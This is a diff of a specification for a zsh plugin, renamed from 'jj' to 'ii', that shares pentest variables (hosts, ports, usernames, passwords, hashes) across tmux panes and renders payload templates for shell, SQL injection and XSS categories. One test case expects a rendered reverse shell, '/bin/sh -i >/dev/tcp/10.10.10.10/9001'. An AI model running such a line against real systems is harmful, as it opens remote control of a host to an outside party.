@@ -3,12 +3,12 @@ tags:
 aliases:
 document_type: spec
 field:
-description: jj zsh plugin specification
+description: ii zsh plugin specification
 ---
 
-# jj Spec
+# ii Spec
 
-`jj` is a zsh plugin for tmux-scoped workflow variables and payload rendering.
+`ii` is a zsh plugin for tmux-scoped workflow variables and payload rendering.
 
 The plugin is designed for tmux-heavy terminal workflows where multiple panes
 need to share target values, render payload templates, and copy the rendered
@@ -16,7 +16,7 @@ payload without stale shell state.
 
 ## Product Goals
 
-`jj` manages five concerns:
+`ii` manages five concerns:
 
 ```text
 1. tmux session-scoped variables
@@ -50,18 +50,18 @@ current shell environment = local state for the current pane, without JJ_ prefix
 Command behavior follows this model:
 
 ```text
-jjs   writes internal JJ_ names to tmux and unprefixed names to current shell
-jjl   loads tmux session values into current shell without JJ_ prefix
-jjv   reads tmux session values and displays them without JJ_ prefix
-jji   reads tmux session values, then copies selected variable values
-jjp   reads tmux session values directly while rendering
+ii s   writes internal JJ_ names to tmux and unprefixed names to current shell
+ii l   loads tmux session values into current shell without JJ_ prefix
+ii v   reads tmux session values and displays them without JJ_ prefix
+ii i   reads tmux session values, then copies selected variable values
+ii p   reads tmux session values directly while rendering
 ```
 
 This distinction is required:
 
 ```text
-echo $LHOST          needs jjl first in that pane
-jjp render payload   does not need jjl; it reads tmux directly
+echo $LHOST          needs ii l first in that pane
+ii p render payload   does not need ii l; it reads tmux directly
 ```
 
 ## Public Interface
@@ -69,59 +69,59 @@ jjp render payload   does not need jjl; it reads tmux directly
 ### Dispatcher
 
 ```text
-jj COMMAND [ARGS]
+ii COMMAND [ARGS]
 ```
 
 Dispatches to command implementations:
 
 ```text
-jj set
-jj load
-jj interactive
-jj variable
-jj payload
-jj unset
-jj help
+ii set
+ii load
+ii interactive
+ii variable
+ii payload
+ii unset
+ii help
 ```
 
-### Wrappers
+### Short Subcommands
 
-```zsh
-jjs() { jj set "$@" }
-jjl() { jj load "$@" }
-jji() { jj interactive "$@" }
-jjv() { jj variable "$@" }
-jjp() { jj payload "$@" }
-jjh() { jj help "$@" }
+```text
+ii s
+ii l
+ii i
+ii v
+ii p
+ii h
 ```
 
 Final naming decision:
 
 ```text
-jjs = jj set
-jjl = jj load
-jji = jj interactive
-jjv = jj variable
-jjp = jj payload
-jjh = jj help
+ii s = ii set
+ii l = ii load
+ii i = ii interactive
+ii v = ii variable
+ii p = ii payload
+ii h = ii help
 ```
 
-`jjp` is payload-only. Variable listing belongs to `jjv`.
+`ii p` is payload-only. Variable listing belongs to `ii v`.
 
 ## Command Specs
 
-### `jj set NAME VALUE`
+### `ii set NAME VALUE`
 
-Wrapper:
+Short form:
 
 ```text
-jjs NAME VALUE
+ii s NAME VALUE
 ```
 
 With no arguments:
 
 ```text
-jjs
+ii s
 ```
 
 opens a TUI for common variables:
@@ -132,25 +132,40 @@ LHOST
 RHOST
 LPORT
 RPORT
+USER1
+PASSWD1
+HASH1
+USER2
+PASSWD2
+HASH2
+```
+
+With one filter argument, opens the set TUI focused on matching variable names.
+Single-letter shortcuts include `r` for `RHOST`:
+
+```zsh
+ii s r
+ii s:r
 ```
 
 Behavior:
 
 ```text
 1. Normalize NAME into JJ_NAME.
+   Names are canonicalized to uppercase, so user2 and USER2 both become JJ_USER2.
 2. Validate the normalized variable name.
 3. Store JJ_NAME=VALUE in the current tmux session environment.
-4. Export NAME=VALUE into the current shell.
+4. Export uppercase and lowercase shell variables into the current shell.
 5. Print NAME=VALUE without the internal JJ_ prefix.
 ```
 
 Example:
 
 ```zsh
-jjs LHOST 192.168.45.192
-jjs LPORT 443
-jjs RHOST 192.168.201.175
-jjs RPORT 80
+ii s LHOST 192.168.45.192
+ii s LPORT 443
+ii s RHOST 192.168.201.175
+ii s RPORT 80
 ```
 
 Stored values:
@@ -166,17 +181,21 @@ User-facing shell values:
 
 ```text
 LHOST=192.168.45.192
+lhost=192.168.45.192
 LPORT=443
+lport=443
 RHOST=192.168.201.175
+rhost=192.168.201.175
 RPORT=80
+rport=80
 ```
 
-### `jj load`
+### `ii load`
 
-Wrapper:
+Short form:
 
 ```text
-jjl
+ii l
 ```
 
 Behavior:
@@ -185,7 +204,9 @@ Behavior:
 1. Read all JJ_ variables from the current tmux session.
 2. Validate each variable name before export.
 3. Export each variable into the current shell without the JJ_ prefix.
-4. Print the number of loaded variables.
+   Both uppercase and lowercase shell names are exported.
+4. Do not export default variable names that have not been assigned values.
+5. Print the number of loaded variables.
 ```
 
 Purpose:
@@ -197,39 +218,47 @@ Synchronize an existing pane after another pane has changed tmux session values.
 Example:
 
 ```zsh
-jjl
+ii l
 echo $LHOST
 ```
 
-### `jj interactive`
+### `ii interactive`
 
-Wrapper:
+Short form:
 
 ```text
-jji
+ii i
 ```
 
 Behavior:
 
 ```text
-1. Read all JJ_ variables from tmux.
-2. Present them in fzf.
-3. Support fuzzy search.
-4. Support Tab multi-select.
-5. Copy selected variable values through the configured copy layer.
-6. Print the copied values.
-7. Do not export values into the current shell.
+1. Read configured JJ_ variables from tmux.
+2. Merge them with default variable names.
+3. Present names only in fzf.
+4. Show the selected variable value in preview.
+5. Support case-insensitive fuzzy search.
+6. Enter edits the selected variable value.
+7. Ctrl-A prompts for a new variable name and value.
+8. Ctrl-Y copies selected existing variable values.
+9. Show `add new variable` as the final option.
+10. If `add new variable` is selected, prompt for a variable name and value.
+   A name without a value stores an empty value.
+11. Support Tab multi-select.
+12. Copy selected existing variable values through the configured copy layer.
+13. Print the copied values.
+14. Do not export values into the current shell.
 ```
 
-This command is a variable copy layer, not a shell loading layer. Use `jjl` to
-load all tmux variables into the current shell.
+This command is a variable copy/add layer, not a shell loading layer. Use
+`ii l` to load non-empty tmux variables into the current shell.
 
-### `jj variable [PATTERN]`
+### `ii variable [PATTERN]`
 
-Wrapper:
+Short form:
 
 ```text
-jjv [PATTERN]
+ii v [PATTERN]
 ```
 
 Behavior:
@@ -247,11 +276,11 @@ Behavior:
 Examples:
 
 ```zsh
-jjv
-jjv host
-jjv cred
-jjv port
-jjv domain
+ii v
+ii v host
+ii v cred
+ii v port
+ii v domain
 ```
 
 Expected host view:
@@ -296,16 +325,16 @@ HASH2
 Expected fallback filtering:
 
 ```text
-jjv port   matches LPORT and RPORT
-jjv 443    does not match LPORT=443 unless the variable name contains 443
+ii v port   matches LPORT and RPORT
+ii v 443    does not match LPORT=443 unless the variable name contains 443
 ```
 
-### `jj payload [CATEGORY]`
+### `ii payload [CATEGORY]`
 
-Wrapper:
+Short form:
 
 ```text
-jjp [CATEGORY]
+ii p [CATEGORY]
 ```
 
 Behavior:
@@ -317,6 +346,7 @@ Behavior:
 4. Let fzf handle fuzzy search and selection.
 5. Resolve the selected entry to a payload file.
 6. Render the template with fresh tmux JJ_ values.
+   Missing or empty values render as lowercase shell fallbacks like $rhost.
 7. Copy the rendered payload.
 8. Print the rendered payload.
 9. Print variables used by the selected payload.
@@ -336,12 +366,12 @@ xss      xss/*
 First implementation supports argument-based category filtering:
 
 ```zsh
-jjp
-jjp shell
-jjp linux
-jjp windows
-jjp sqli
-jjp xss
+ii p
+ii p shell
+ii p linux
+ii p windows
+ii p sqli
+ii p xss
 ```
 
 Future interactive switch support may use fzf keybinds:
@@ -354,7 +384,7 @@ ctrl-w  switch to windows
 ctrl-q  quit
 ```
 
-### `jj unset NAME [...]`
+### `ii unset NAME [...]`
 
 Behavior:
 
@@ -365,7 +395,19 @@ Behavior:
 4. Print each unset variable.
 ```
 
-### `jj help [COMMAND]`
+### `ii unset -a`
+
+Behavior:
+
+```text
+1. Prompt before deleting all JJ_ variables in the current tmux session.
+2. Continue only when the answer is exactly y.
+3. Remove every JJ_ variable from the current tmux session.
+4. Unset matching uppercase and lowercase shell variables.
+5. Print the number of removed variables.
+```
+
+### `ii help [COMMAND]`
 
 Behavior:
 
@@ -381,7 +423,7 @@ Each command owns its help text so new behavior is documented near the command.
 Default path:
 
 ```text
-~/.config/jj/payloads/
+~/.config/ii/payloads/
 ```
 
 Recommended layout:
@@ -459,24 +501,25 @@ Required behavior:
 2. Read tmux session environment at render time.
 3. Replace `${JJ_NAME}` placeholders with tmux values.
 4. Support bare `JJ_NAME` replacement for compatibility.
-5. Leave unknown placeholders unchanged.
-6. Report only variables required by the template and present in tmux.
+5. Render missing or empty tmux values as lowercase shell fallbacks like `$rhost`.
+6. Report every variable required by the template, using shell fallback text for
+   missing or empty values.
 ```
 
 Important test case:
 
 ```text
-pane1: jjs LHOST 10.10.10.10
-pane1: jjs LPORT 9001
+pane1: ii s LHOST 10.10.10.10
+pane1: ii s LPORT 9001
 pane2: echo $LHOST
-pane2: jjp linux
+pane2: ii p linux
 ```
 
 Expected:
 
 ```text
 echo $LHOST prints empty output in pane2
-jjp renders /bin/sh -i >/dev/tcp/10.10.10.10/9001 ...
+ii p renders /bin/sh -i >/dev/tcp/10.10.10.10/9001 ...
 ```
 
 ## Fuzzy Search Layer
@@ -484,21 +527,21 @@ jjp renders /bin/sh -i >/dev/tcp/10.10.10.10/9001 ...
 `fzf` is the selection UI for:
 
 ```text
-jji = variable selection
-jjp = payload selection
+ii i = variable selection
+ii p = payload selection
 ```
 
 Responsibilities:
 
 ```text
-jji:
+ii i:
   - Input: JJ_ variable lines from tmux.
   - UI: fzf with --multi.
   - Display: strip JJ_ prefix for operator readability.
   - Output: selected display NAME=VALUE lines mapped back to JJ_NAME=VALUE.
   - Next layer: safe export into current shell.
 
-jjp:
+ii p:
   - Input: path-style payload entries.
   - UI: fzf selector.
   - Output: one selected payload path.
@@ -508,10 +551,10 @@ jjp:
 Non-interactive fzf testing uses:
 
 ```zsh
-FZF_DEFAULT_OPTS='--filter=sh-tcp' jjp linux
+FZF_DEFAULT_OPTS='--filter=sh-tcp' ii p linux
 ```
 
-When `fzf --filter` returns multiple matches, `jjp` should use the first
+When `fzf --filter` returns multiple matches, `ii p` should use the first
 non-empty selected line. This keeps test mode deterministic and prevents
 multi-line strings from being interpreted as one path.
 
@@ -522,26 +565,26 @@ Variable loading must be separate from payload rendering.
 Responsibilities:
 
 ```text
-jj_var_normalize_name:
+ii_var_normalize_name:
   - Strip leading "export ".
   - Strip anything after "=".
   - Uppercase the name.
   - Add JJ_ prefix when missing.
   - Validate against JJ_[A-Z_][A-Z0-9_]*.
 
-jj_var_lines_from_tmux:
+ii_var_lines_from_tmux:
   - Read tmux show-environment.
   - Return only JJ_ assignments.
 
-jj_export_var_line:
+ii_export_var_line:
   - Validate NAME before export.
   - Export NAME=VALUE into current shell.
 
-jj_var_display_lines_for_fzf:
+ii_var_display_lines_for_fzf:
   - Convert JJ_LHOST=... to LHOST=... for TUI display.
   - Do not change tmux storage format.
 
-jj_var_line_from_display:
+ii_var_line_from_display:
   - Convert selected LHOST=... back to JJ_LHOST=... before export.
 ```
 
@@ -605,12 +648,12 @@ not print confusing escape artifacts.
 
 ## Plugin Architecture
 
-`jj` is plugin-first.
+`ii` is plugin-first.
 
 Public entrypoint:
 
 ```text
-jj.plugin.zsh
+ii.plugin.zsh
 ```
 
 Plugin-level settings:
@@ -631,7 +674,7 @@ lib/clipboard.zsh   copy backend detection and copy
 lib/vars.zsh        variable commands and helpers
 lib/payloads.zsh    payload list, fuzzy selection, render, reports
 lib/help.zsh        help routing
-lib/core.zsh        dispatcher and wrapper functions
+lib/core.zsh        dispatcher and command functions
 ```
 
 Load order:
@@ -650,10 +693,10 @@ Load order:
 Implemented:
 
 ```text
-- plugin entrypoint: jj.plugin.zsh
+- plugin entrypoint: ii.plugin.zsh
 - plugin-provided default JJ_PLUGIN_DIR and JJ_PAYLOAD_DIR
 - layered lib/ structure
-- jjs, jjl, jji, jjv, jjp, jjh wrappers
+- ii dispatcher with short subcommands: s, l, i, v, p, h
 - tmux session variable source of truth
 - argument-based payload filtering
 - fzf payload and variable selection
